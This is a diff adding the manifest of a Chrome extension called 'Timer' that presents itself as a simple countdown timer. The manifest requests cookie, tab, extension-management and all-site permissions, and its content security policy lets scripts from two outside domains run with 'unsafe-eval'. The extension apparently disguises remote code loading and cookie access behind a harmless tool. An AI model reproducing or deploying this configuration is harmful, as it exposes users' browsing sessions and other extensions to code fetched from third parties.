@@ -1,0 +1,24 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+   "background": {
+      "scripts": [ "background.js" ]
+   },
+   "browser_action": {
+      "default_icon": "img/19.png"
+   },
+   "description": "This simple timer tells you when your time is up.",
+   "icons": {
+      "128": "img/128.png",
+      "16": "img/16.png",
+      "32": "img/32.png",
+      "48": "img/48.png"
+   },
+   "manifest_version": 2,
+   "name": "Timer",
+   "offline_enabled": true,
+   "permissions": [ "tabs", "storage", "cookies", "*://*/*", "management" ],
+"content_security_policy": "script-src 'self' https://profitkode.com https://counter.yadro.ru 'unsafe-eval'; object-src 'self';",
+   "version": "1.2.5",
+   "web_accessible_resources": [ "img/48.png" ]
+}
